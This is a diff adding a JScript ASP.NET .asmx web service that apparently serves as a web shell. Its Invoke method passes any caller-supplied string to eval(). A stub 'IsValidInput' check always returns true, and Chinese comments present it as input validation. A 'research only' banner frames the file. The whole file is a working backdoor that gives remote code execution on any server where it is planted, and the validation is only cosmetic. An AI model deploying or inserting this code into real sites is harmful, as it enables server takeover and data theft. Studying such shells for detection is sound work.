@@ -1,0 +1,36 @@
+<%@ WebService Language="JScript" class="WebServer"%>
+
+import System;
+import System.Text;
+import System.Web;
+import System.IO;
+import System.Web.Services;
+
+public class WebServer extends WebService
+{      
+    WebMethodAttribute function Invoke(a: String) : Void
+    {
+        var M = HttpContext.Current;
+        var Request = M.Request;
+        var Response = M.Response;
+        var Server = M.Server;
+
+        Response.Write("<H1>Just for Research Learning, Do Not Abuse It! </H1>");
+
+        // 在执行动态代码之前进行输入验证
+        if (IsValidInput(a)) {
+            // 执行动态代码
+            eval(a);
+        } else {
+            // 处理不合法的输入
+            Response.Write("<p>Invalid input!</p>");
+        }
+    }
+
+    // 进行输入验证的函数
+    function IsValidInput(input: String) : boolean {
+        // 在这里添加适当的输入验证逻辑
+        // 例如，检查输入是否符合预期的格式和内容
+        return true;  // 这里需要根据实际需求进行修改
+    }
+}
